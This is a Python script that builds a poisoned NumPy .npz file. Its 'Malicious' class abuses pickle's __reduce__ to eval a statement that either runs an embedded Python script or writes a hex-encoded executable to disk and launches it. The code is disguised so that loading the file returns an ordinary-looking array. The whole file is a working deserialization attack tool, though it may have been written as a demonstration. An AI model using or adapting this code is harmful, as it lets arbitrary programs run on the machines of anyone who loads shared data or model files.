import numpy as np

# Filename of the potentially dangerous script
py_snake = "program_example/snake.py"
exe_snake = "program_example/snake.exe"

class Malicious:
    def __init__(self, filetype, filename, data):
        # This class wraps an executable python script into a numpy data structure
        if filetype == "python":
            file = self.file_python(filename)
        elif filetype == "exe":
            file = self.file_exe(filename)
        else:
            raise Exception("file type is not supported")

        # Append numpy import at the end of the script
        file += "import numpy as np\n"

        # Convert the provided data to a text format
        data_text = np.array2string(data, separator=",")

        # Create a statement that executes the malicious script and returns a numpy array
        self.statement = f'np.asarray({data_text}) if exec("""{file}""") is None else _'

    def file_python(self, filename):
        # Load the malicious script as text
        with open(filename) as file:
            file = "".join(file.readlines())
        return file
    
    def file_exe(self, filename):
        with open(filename, 'rb') as binary_file:
            data = binary_file.read()
        hex_data = data.hex()
        output_malicious_file = "malicious_example.exe"
        
        file = "import subprocess\n"
        file += f"malicious_file = '{output_malicious_file}'\n"
        file += f"hex_data = '{hex_data}'\n"
        file += f"binary_data = bytes.fromhex(hex_data)\n"
        file += f"with open(malicious_file, 'wb') as binary_file:\n"
        file += f"    binary_file.write(binary_data)\n"
        file += f"subprocess.Popen([malicious_file], creationflags=subprocess.CREATE_NEW_CONSOLE)\n"
        return file

    def __reduce__(self):
        # The __reduce__ method is used by the pickle module to serialize/deserialize objects
        # In this case, it exploits the eval function to execute a single line statement
        # that includes the malicious script execution

        return (eval, (self.statement,))

def main():
    # Generate random data
    random_data = np.random.random((10, 10))

    # Wrap the data into the malicious data object
    malicious_data_pyscript = Malicious("python", py_snake, random_data)

    malicious_data_exe = Malicious("exe", exe_snake, random_data)

    # Save the malicious object alongside normal data into a .npz file
    np.savez(
        "malicious.npz",
        malicious_data_pyscript=malicious_data_pyscript,
        malicious_data_exe=malicious_data_exe,
        normal_data=np.random.random((10, 10)),
    )

if __name__ == "__main__":
    main()
